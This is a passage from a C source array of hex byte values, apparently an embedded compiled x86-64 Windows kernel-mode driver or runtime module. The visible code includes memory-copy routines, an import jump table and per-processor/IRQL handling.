    0xC2, 0x48, 0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x09, 0x48, 0xF7, 0xC1, 0xFF, 0x0F,
    0x00, 0x00, 0x74, 0x29, 0x48, 0x8B, 0xD1, 0x48, 0x8D, 0x0D, 0x52, 0x40, 0x00, 0x00, 0xE8, 0x45,
    0x02, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8,
    0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x33, 0xFF, 0x48,
    0x89, 0x4D, 0x18, 0x33, 0xC0, 0x89, 0x7B, 0x14, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4,
    0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x18, 0x00, 0x00, 0x00, 0x41, 0xB8,
    0x20, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x65, 0x3F, 0x00, 0x00, 0xE9, 0xD2, 0x00, 0x00, 0x00,
    0x83, 0xFA, 0x1C, 0x76, 0x2D, 0x48, 0x8D, 0x15, 0x1C, 0x3F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF5,
    0x3E, 0x00, 0x00, 0xE8, 0xE0, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14,
    0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0x83, 0xFA, 0x1C, 0x75, 0x3F, 0x8B, 0x4B, 0x18, 0x4C, 0x8D, 0x43, 0x18, 0x8D, 0x04,
    0xCD, 0x20, 0x00, 0x00, 0x00, 0x44, 0x3B, 0xC8, 0x75, 0x2C, 0x8B, 0xD1, 0x4C, 0x8D, 0x4B, 0x20,
    0x48, 0x8B, 0xCD, 0xE8, 0xB8, 0xE9, 0xFF, 0xFF, 0x85, 0xC0, 0x89, 0x43, 0x14, 0x79, 0x07, 0xC7,
    0x43, 0x0C, 0x18, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4,
    0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x8B, 0x43, 0x18, 0x41, 0xB8, 0x1C, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0x1A, 0x3E, 0x00, 0x00, 0x8D, 0x04, 0xC5, 0x20, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24,
    0x20, 0xEB, 0x3F, 0x83, 0xFA, 0x20, 0x75, 0x25, 0x41, 0x83, 0xF9, 0x18, 0x75, 0x1F, 0x48, 0x8B,
    0x53, 0x18, 0x48, 0x8B, 0xCD, 0xE8, 0x46, 0xEB, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89,
    0x43, 0x14, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24,
    0x20, 0x18, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x2E, 0x3D,
    0x00, 0x00, 0xE8, 0x21, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE,
    0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B,
    0xC3, 0x83, 0xC8, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0x44, 0x8B, 0x43, 0x04, 0x8B, 0xD1, 0x48, 0x8D, 0x0D, 0xC9, 0x3C, 0x00, 0x00, 0xE8,
    0xE4, 0x00, 0x00, 0x00, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0x8B, 0x53, 0x08, 0x45, 0x8B, 0xC8, 0x44, 0x8B, 0x43, 0x0C, 0x48, 0x8D, 0x0D, 0x5D,
    0x3C, 0x00, 0x00, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4,
    0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x66, 0x90, 0x50, 0x42, 0x00, 0x00, 0x64, 0x43, 0x00, 0x00,
    0xBC, 0x43, 0x00, 0x00, 0xFC, 0x43, 0x00, 0x00, 0x13, 0x46, 0x00, 0x00, 0x9E, 0x47, 0x00, 0x00,
    0xA2, 0x49, 0x00, 0x00, 0xE8, 0x49, 0x00, 0x00, 0x6F, 0x4A, 0x00, 0x00, 0xED, 0x4B, 0x00, 0x00,
    0x93, 0x4C, 0x00, 0x00, 0x10, 0x4E, 0x00, 0x00, 0xA3, 0x4E, 0x00, 0x00, 0x20, 0x44, 0x00, 0x00,
    0x28, 0x45, 0x00, 0x00, 0x6C, 0x45, 0x00, 0x00, 0xCF, 0x45, 0x00, 0x00, 0xAB, 0x4B, 0x00, 0x00,
    0x6A, 0x4D, 0x00, 0x00, 0xD7, 0x4C, 0x00, 0x00, 0x2B, 0x4D, 0x00, 0x00, 0x01, 0x4F, 0x00, 0x00,
    0x00, 0x15, 0x15, 0x15, 0x01, 0x15, 0x15, 0x15, 0x02, 0x15, 0x15, 0x15, 0x03, 0x15, 0x15, 0x15,
    0x04, 0x15, 0x15, 0x15, 0x05, 0x15, 0x15, 0x15, 0x06, 0x15, 0x15, 0x15, 0x07, 0x15, 0x15, 0x15,
    0x08, 0x15, 0x15, 0x15, 0x09, 0x15, 0x15, 0x15, 0x0A, 0x15, 0x15, 0x15, 0x0B, 0x15, 0x15, 0x15,
    0x0C, 0x15, 0x15, 0x15, 0x0D, 0x15, 0x15, 0x15, 0x0E, 0x15, 0x15, 0x15, 0x0F, 0x15, 0x15, 0x15,
    0x10, 0x15, 0x15, 0x15, 0x11, 0x15, 0x15, 0x15, 0x12, 0x15, 0x15, 0x15, 0x13, 0x15, 0x15, 0x15,
    0x14, 0xCC, 0xFF, 0x25, 0x98, 0x38, 0x00, 0x00, 0xFF, 0x25, 0x9A, 0x38, 0x00, 0x00, 0xFF, 0x25,
    0x9C, 0x38, 0x00, 0x00, 0xFF, 0x25, 0x9E, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xA0, 0x38, 0x00, 0x00,
    0xFF, 0x25, 0xA2, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xA4, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xA6, 0x38,
    0x00, 0x00, 0xFF, 0x25, 0xA8, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xAA, 0x38, 0x00, 0x00, 0xFF, 0x25,
    0xAC, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xAE, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xB0, 0x38, 0x00, 0x00,
    0xFF, 0x25, 0xB2, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xB4, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xB6, 0x38,
    0x00, 0x00, 0xFF, 0x25, 0xB8, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xBA, 0x38, 0x00, 0x00, 0xFF, 0x25,
    0xBC, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xBE, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xC0, 0x38, 0x00, 0x00,
    0xFF, 0x25, 0xC2, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xC4, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xC6, 0x38,
    0x00, 0x00, 0xFF, 0x25, 0xC8, 0x38, 0x00, 0x00, 0xFF, 0x25, 0xCA, 0x38, 0x00, 0x00, 0xFF, 0x25,
    0xCC, 0x38, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90,
    0x48, 0x8B, 0xC1, 0x49, 0x83, 0xF8, 0x08, 0x72, 0x53, 0x0F, 0xB6, 0xD2, 0x49, 0xB9, 0x01, 0x01,
    0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x49, 0x0F, 0xAF, 0xD1, 0x49, 0x83, 0xF8, 0x40, 0x72, 0x1E,
    0x48, 0xF7, 0xD9, 0x83, 0xE1, 0x07, 0x74, 0x06, 0x4C, 0x2B, 0xC1, 0x48, 0x89, 0x10, 0x48, 0x03,
    0xC8, 0x4D, 0x8B, 0xC8, 0x49, 0x83, 0xE0, 0x3F, 0x49, 0xC1, 0xE9, 0x06, 0x75, 0x39, 0x4D, 0x8B,
    0xC8, 0x49, 0x83, 0xE0, 0x07, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x11, 0x66, 0x66, 0x66, 0x90, 0x90,
    0x48, 0x89, 0x11, 0x48, 0x83, 0xC1, 0x08, 0x49, 0xFF, 0xC9, 0x75, 0xF4, 0x4D, 0x85, 0xC0, 0x74,
    0x0A, 0x88, 0x11, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x75, 0xF6, 0xC3, 0x66, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x04, 0x00, 0x00, 0x73, 0x30,
    0x48, 0x89, 0x11, 0x48, 0x89, 0x51, 0x08, 0x48, 0x89, 0x51, 0x10, 0x48, 0x83, 0xC1, 0x40, 0x48,
    0x89, 0x51, 0xD8, 0x48, 0x89, 0x51, 0xE0, 0x49, 0xFF, 0xC9, 0x48, 0x89, 0x51, 0xE8, 0x48, 0x89,
    0x51, 0xF0, 0x48, 0x89, 0x51, 0xF8, 0x75, 0xD8, 0xEB, 0x94, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x0F, 0xC3, 0x11, 0x48, 0x0F, 0xC3, 0x51, 0x08, 0x48, 0x0F, 0xC3, 0x51, 0x10, 0x48, 0x83,
    0xC1, 0x40, 0x48, 0x0F, 0xC3, 0x51, 0xD8, 0x48, 0x0F, 0xC3, 0x51, 0xE0, 0x49, 0xFF, 0xC9, 0x48,
    0x0F, 0xC3, 0x51, 0xE8, 0x48, 0x0F, 0xC3, 0x51, 0xF0, 0x48, 0x0F, 0xC3, 0x51, 0xF8, 0x75, 0xD0,
    0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9, 0x54, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90,
    0x4C, 0x8B, 0xD9, 0x48, 0x2B, 0xD1, 0x0F, 0x86, 0x9C, 0x01, 0x00, 0x00, 0x49, 0x83, 0xF8, 0x08,
    0x72, 0x62, 0xF6, 0xC1, 0x07, 0x74, 0x37, 0xF6, 0xC1, 0x01, 0x74, 0x0C, 0x8A, 0x04, 0x0A, 0x49,
    0xFF, 0xC8, 0x88, 0x01, 0x48, 0x83, 0xC1, 0x01, 0xF6, 0xC1, 0x02, 0x74, 0x0F, 0x66, 0x8B, 0x04,
    0x0A, 0x49, 0x83, 0xE8, 0x02, 0x66, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x02, 0xF6, 0xC1, 0x04, 0x74,
    0x0D, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x04, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x04, 0x4D, 0x8B,
    0xC8, 0x49, 0xC1, 0xE9, 0x05, 0x75, 0x50, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x14,
    0x48, 0x8B, 0x04, 0x0A, 0x48, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x08, 0x49, 0xFF, 0xC9, 0x75, 0xF0,
    0x49, 0x83, 0xE0, 0x07, 0x4D, 0x85, 0xC0, 0x75, 0x07, 0x49, 0x8B, 0xC3, 0xC3, 0x66, 0x66, 0x90,
    0x8A, 0x04, 0x0A, 0x88, 0x01, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x75, 0xF3, 0x49, 0x8B, 0xC3,
    0xC3, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x08, 0x00, 0x00, 0x73, 0x42,
    0x48, 0x8B, 0x04, 0x0A, 0x4C, 0x8B, 0x54, 0x0A, 0x08, 0x48, 0x83, 0xC1, 0x20, 0x48, 0x89, 0x41,
    0xE0, 0x4C, 0x89, 0x51, 0xE8, 0x48, 0x8B, 0x44, 0x0A, 0xF0, 0x4C, 0x8B, 0x54, 0x0A, 0xF8, 0x49,
    0xFF, 0xC9, 0x48, 0x89, 0x41, 0xF0, 0x4C, 0x89, 0x51, 0xF8, 0x75, 0xD4, 0x49, 0x83, 0xE0, 0x1F,
    0xE9, 0x72, 0xFF, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x66, 0x90, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0xB5, 0xB8, 0x20, 0x00, 0x00, 0x00,
    0x0F, 0x18, 0x04, 0x0A, 0x0F, 0x18, 0x44, 0x0A, 0x40, 0x48, 0x81, 0xC1, 0x80, 0x00, 0x00, 0x00,
    0xFF, 0xC8, 0x75, 0xEC, 0x48, 0x81, 0xE9, 0x00, 0x10, 0x00, 0x00, 0xB8, 0x40, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0x0C, 0x0A, 0x4C, 0x8B, 0x54, 0x0A, 0x08, 0x4C, 0x0F, 0xC3, 0x09, 0x4C, 0x0F, 0xC3,
    0x51, 0x08, 0x4C, 0x8B, 0x4C, 0x0A, 0x10, 0x4C, 0x8B, 0x54, 0x0A, 0x18, 0x4C, 0x0F, 0xC3, 0x49,
    0x10, 0x4C, 0x0F, 0xC3, 0x51, 0x18, 0x4C, 0x8B, 0x4C, 0x0A, 0x20, 0x4C, 0x8B, 0x54, 0x0A, 0x28,
    0x48, 0x83, 0xC1, 0x40, 0x4C, 0x0F, 0xC3, 0x49, 0xE0, 0x4C, 0x0F, 0xC3, 0x51, 0xE8, 0x4C, 0x8B,
    0x4C, 0x0A, 0xF0, 0x4C, 0x8B, 0x54, 0x0A, 0xF8, 0xFF, 0xC8, 0x4C, 0x0F, 0xC3, 0x49, 0xF0, 0x4C,
    0x0F, 0xC3, 0x51, 0xF8, 0x75, 0xAA, 0x49, 0x81, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81, 0xF8,
    0x00, 0x10, 0x00, 0x00, 0x0F, 0x83, 0x71, 0xFF, 0xFF, 0xFF, 0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9,
    0xBA, 0xFE, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x74, 0x6F, 0x49, 0x03, 0xC8, 0x49, 0x83, 0xF8,
    0x08, 0x72, 0x61, 0xF6, 0xC1, 0x07, 0x74, 0x36, 0xF6, 0xC1, 0x01, 0x74, 0x0B, 0x48, 0xFF, 0xC9,
    0x8A, 0x04, 0x0A, 0x49, 0xFF, 0xC8, 0x88, 0x01, 0xF6, 0xC1, 0x02, 0x74, 0x0F, 0x48, 0x83, 0xE9,
    0x02, 0x66, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x02, 0x66, 0x89, 0x01, 0xF6, 0xC1, 0x04, 0x74,
    0x0D, 0x48, 0x83, 0xE9, 0x04, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x04, 0x89, 0x01, 0x4D, 0x8B,
    0xC8, 0x49, 0xC1, 0xE9, 0x05, 0x75, 0x50, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x14,
    0x48, 0x83, 0xE9, 0x08, 0x48, 0x8B, 0x04, 0x0A, 0x49, 0xFF, 0xC9, 0x48, 0x89, 0x01, 0x75, 0xF0,
    0x49, 0x83, 0xE0, 0x07, 0x4D, 0x85, 0xC0, 0x75, 0x07, 0x49, 0x8B, 0xC3, 0xC3, 0x66, 0x66, 0x90,
    0x48, 0xFF, 0xC9, 0x8A, 0x04, 0x0A, 0x49, 0xFF, 0xC8, 0x88, 0x01, 0x75, 0xF3, 0x49, 0x8B, 0xC3,
    0xC3, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x08, 0x00, 0x00, 0x73, 0x42,
    0x48, 0x8B, 0x44, 0x0A, 0xF8, 0x4C, 0x8B, 0x54, 0x0A, 0xF0, 0x48, 0x83, 0xE9, 0x20, 0x48, 0x89,
    0x41, 0x18, 0x4C, 0x89, 0x51, 0x10, 0x48, 0x8B, 0x44, 0x0A, 0x08, 0x4C, 0x8B, 0x14, 0x0A, 0x49,
    0xFF, 0xC9, 0x48, 0x89, 0x41, 0x08, 0x4C, 0x89, 0x11, 0x75, 0xD5, 0x49, 0x83, 0xE0, 0x1F, 0xE9,
    0x73, 0xFF, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x66, 0x90, 0x48, 0x81, 0xFA, 0x00, 0xF0, 0xFF, 0xFF, 0x77, 0xB5, 0xB8, 0x20, 0x00, 0x00, 0x00,
    0x48, 0x81, 0xE9, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x18, 0x04, 0x0A, 0x0F, 0x18, 0x44, 0x0A, 0x40,
    0xFF, 0xC8, 0x75, 0xEC, 0x48, 0x81, 0xC1, 0x00, 0x10, 0x00, 0x00, 0xB8, 0x40, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0x4C, 0x0A, 0xF8, 0x4C, 0x8B, 0x54, 0x0A, 0xF0, 0x4C, 0x0F, 0xC3, 0x49, 0xF8, 0x4C,
    0x0F, 0xC3, 0x51, 0xF0, 0x4C, 0x8B, 0x4C, 0x0A, 0xE8, 0x4C, 0x8B, 0x54, 0x0A, 0xE0, 0x4C, 0x0F,
    0xC3, 0x49, 0xE8, 0x4C, 0x0F, 0xC3, 0x51, 0xE0, 0x4C, 0x8B, 0x4C, 0x0A, 0xD8, 0x4C, 0x8B, 0x54,
    0x0A, 0xD0, 0x48, 0x83, 0xE9, 0x40, 0x4C, 0x0F, 0xC3, 0x49, 0x18, 0x4C, 0x0F, 0xC3, 0x51, 0x10,
    0x4C, 0x8B, 0x4C, 0x0A, 0x08, 0x4C, 0x8B, 0x14, 0x0A, 0xFF, 0xC8, 0x4C, 0x0F, 0xC3, 0x49, 0x08,
    0x4C, 0x0F, 0xC3, 0x11, 0x75, 0xAA, 0x49, 0x81, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81, 0xF8,
    0x00, 0x10, 0x00, 0x00, 0x0F, 0x83, 0x71, 0xFF, 0xFF, 0xFF, 0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9,
    0xBA, 0xFE, 0xFF, 0xFF, 0xFF, 0x25, 0x7E, 0x34, 0x00, 0x00, 0xFF, 0x25, 0x80, 0x34, 0x00, 0x00,
    0x48, 0xFF, 0x25, 0x81, 0x34, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0xFF, 0x25, 0x79, 0x34, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xC1, 0x01, 0x83, 0xC0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x11, 0x48, 0x8B, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x65, 0x8A, 0x04, 0x25, 0x84, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xC8, 0xFF, 0x48, 0x83, 0xF9, 0x40, 0x48, 0x0F, 0x42, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC,
    0x83, 0xF9, 0x40, 0x73, 0x04, 0x48, 0x63, 0xC1, 0xC3, 0x48, 0x83, 0xC8, 0xFF, 0xC3, 0xCC, 0xCC,
    0x48, 0xB8, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xF9, 0x40, 0x48, 0x8B, 0xD9, 0x72, 0x08, 0x32,
    0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xFF, 0x15, 0xAB, 0x33, 0x00, 0x00, 0x48, 0x0F, 0xA3,
    0xD8, 0x0F, 0x92, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xF9, 0x40, 0x48, 0x8B, 0xD9, 0x72, 0x08, 0x32,
    0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xFF, 0x15, 0x7B, 0x33, 0x00, 0x00, 0x48, 0x0F, 0xA3,
    0xD8, 0x0F, 0x92, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xFF, 0x15, 0x59, 0x33, 0x00, 0x00, 0x48,
    0x89, 0x03, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0xFF, 0x15, 0x3E, 0x33, 0x00, 0x00, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x4C,
    0x8B, 0xD8, 0x33, 0xC0, 0x48, 0x83, 0xE9, 0x01, 0x49, 0x0F, 0xA3, 0xCB, 0x73, 0x04, 0x48, 0x83,
    0xC0, 0x01, 0x48, 0x85, 0xC9, 0x75, 0xED, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xCA, 0xF0, 0x83, 0x42, 0x20, 0x01, 0x65, 0x8A, 0x04, 0x25, 0x84, 0x01, 0x00, 0x00,
    0x4C, 0x8B, 0x42, 0x10, 0x48, 0x8B, 0x52, 0x08, 0x0F, 0xB6, 0xC8, 0x49, 0xFF, 0x21, 0xCC, 0xCC,
    0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x53,
    0x55, 0x56, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x48, 0x45, 0x8B, 0xF9, 0x49,
    0x8B, 0xD8, 0x48, 0x8B, 0xEA, 0x4C, 0x8B, 0xE1, 0xFF, 0x15, 0xCA, 0x32, 0x00, 0x00, 0x45, 0x85,
    0xFF, 0x48, 0x8B, 0xB4, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF0, 0x75, 0x1F, 0x48, 0x83,
    0xFE, 0x40, 0x73, 0x06, 0x48, 0x0F, 0xA3, 0xF0, 0x72, 0x13, 0xB8, 0xDF, 0xFC, 0xFF, 0xFF, 0x48,
    0x83, 0xC4, 0x48, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5E, 0x5D, 0x5B, 0xC3, 0x48, 0x8D, 0x15,
    0xFC, 0x33, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0x11, 0x32, 0x00, 0x00, 0x48,
    0x8D, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0xFE, 0x31, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x89, 0x44,
    0x24, 0x20, 0x75, 0x13, 0xB8, 0xDB, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x48, 0x41, 0x5F, 0x41,
    0x5E, 0x41, 0x5C, 0x5E, 0x5D, 0x5B, 0xC3, 0xBA, 0x28, 0x10, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8,
    0x70, 0x4D, 0x54, 0x52, 0x48, 0x89, 0xBC, 0x24, 0x98, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x9E, 0x32,
    0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8, 0x75, 0x08, 0x8D, 0x47, 0xF8, 0xE9, 0x32, 0x01,
    0x00, 0x00, 0x48, 0x89, 0x58, 0x10, 0x33, 0xDB, 0x45, 0x85, 0xFF, 0x4C, 0x89, 0x6C, 0x24, 0x40,
    0x4C, 0x89, 0x20, 0x48, 0x89, 0x68, 0x08, 0x48, 0xC7, 0x40, 0x18, 0xFF, 0xFF, 0xFF, 0xFF, 0x4C,
    0x8D, 0x68, 0x28, 0x89, 0x58, 0x20, 0x75, 0x34, 0x48, 0x8D, 0x15, 0xF1, 0xFE, 0xFF, 0xFF, 0x4C,
    0x8B, 0xC0, 0x49, 0x8B, 0xCD, 0xFF, 0x15, 0xE5, 0x31, 0x00, 0x00, 0x41, 0xBC, 0x02, 0x00, 0x00,
    0x00, 0x49, 0x8B, 0xCD, 0x41, 0x8B, 0xD4, 0xFF, 0x15, 0xCB, 0x31, 0x00, 0x00, 0x40, 0x0F, 0xB6,
    0xD6, 0x49, 0x8B, 0xCD, 0xFF, 0x15, 0xB6, 0x31, 0x00, 0x00, 0xEB, 0x4C, 0x8B, 0xEB, 0x49, 0x8B,
    0xF5, 0x41, 0xBC, 0x02, 0x00, 0x00, 0x00, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8D, 0x15, 0xA9, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x9D,
    0x31, 0x00, 0x00, 0x41, 0x8B, 0xD4, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x89, 0x31, 0x00, 0x00, 0x40,
    0x0F, 0xB6, 0xD5, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x74, 0x31, 0x00, 0x00, 0x83, 0xC5, 0x01, 0x48,
    0x83, 0xC6, 0x40, 0x83, 0xFD, 0x40, 0x72, 0xC8, 0x44, 0x0F, 0x20, 0xC5, 0x45, 0x0F, 0x22, 0xC4,
    0x45, 0x85, 0xFF, 0x75, 0x10, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x49, 0x8B, 0xCD, 0xFF, 0x15, 0x0D,
    0x31, 0x00, 0x00, 0xEB, 0x51, 0x65, 0x8A, 0x04, 0x25, 0x84, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0xF0,
    0x3B, 0xDE, 0x74, 0x1A, 0x8B, 0xCB, 0x49, 0x0F, 0xA3, 0xCE, 0x73, 0x12, 0x48, 0xC1, 0xE1, 0x06,
    0x45, 0x33, 0xC0, 0x33, 0xD2, 0x49, 0x03, 0xCD, 0xFF, 0x15, 0xE2, 0x30, 0x00, 0x00, 0x83, 0xC3,
    0x01, 0x83, 0xFB, 0x40, 0x72, 0xDA, 0x41, 0x83, 0xFF, 0x01, 0x74, 0x1A, 0x4C, 0x8B, 0x84, 0x24,
    0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF,
    0x94, 0x24, 0x80, 0x00, 0x00, 0x00, 0x40, 0x0F, 0xB6, 0xC5, 0x44, 0x0F, 0x22, 0xC0, 0xFF, 0x54,
    0x24, 0x20, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x5B, 0x31, 0x00, 0x00, 0x4C, 0x8B, 0x6C,
